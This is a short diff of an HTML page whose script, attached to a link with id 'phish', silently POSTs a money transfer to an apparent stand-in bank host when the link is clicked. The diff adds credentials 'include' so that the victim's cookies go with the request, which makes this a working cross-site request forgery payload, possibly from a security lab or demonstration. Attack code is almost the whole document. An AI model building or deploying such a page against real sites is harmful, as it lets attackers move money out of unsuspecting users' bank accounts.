@@ -18,18 +18,18 @@
 
 <script>
 document.getElementById("phish").addEventListener("click", function (e) {
-  e.preventDefault();                // evita navegação
+  e.preventDefault();
   fetch("https://banco.fake.seg.br/transfer", {
       method: "POST",
-      mode: "no-cors",
+      credentials: "include",                         // envia cookies
       headers: {"Content-Type":"application/x-www-form-urlencoded"},
       body: "value=200"
   }).finally(() => {
-      // exibe feedback visual
       document.getElementById("msg").style.display = "block";
   });
 });
 </script>
+
 
 </body>
 </html>
